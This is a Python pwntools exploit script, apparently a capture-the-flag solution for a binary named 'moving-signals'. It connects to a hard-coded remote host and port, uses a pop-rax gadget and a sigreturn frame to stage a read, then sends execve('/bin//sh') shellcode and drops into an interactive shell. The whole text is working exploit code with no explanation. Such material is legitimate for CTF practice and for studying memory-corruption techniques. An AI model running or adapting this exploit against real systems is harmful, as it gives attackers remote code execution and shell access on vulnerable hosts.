from pwn import *
#p = process("./moving-signals")
p = remote("161.97.176.150", 2525) 
pause()
elf = ELF("./moving-signals")
pop_rax = 0x41018
syscall = 0x41015
context(arch="amd64")
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
if __name__ == "__main__": 
    payload = "/bin//sh"
    payload += p64(pop_rax)
    payload += p64(0xf)
    payload += p64(syscall)

    frame = SigreturnFrame(arch="amd64")
    frame.rax = 0x0
    frame.rdi = 0x0
    frame.rsp = 0x41900
    frame.rsi = 0x41900
    frame.rdx = 0x100
    frame.rip = syscall
    payload += str(frame)
    p.sendline(payload)
    p.send(p64(0x41908) + shellcode)
    p.interactive()
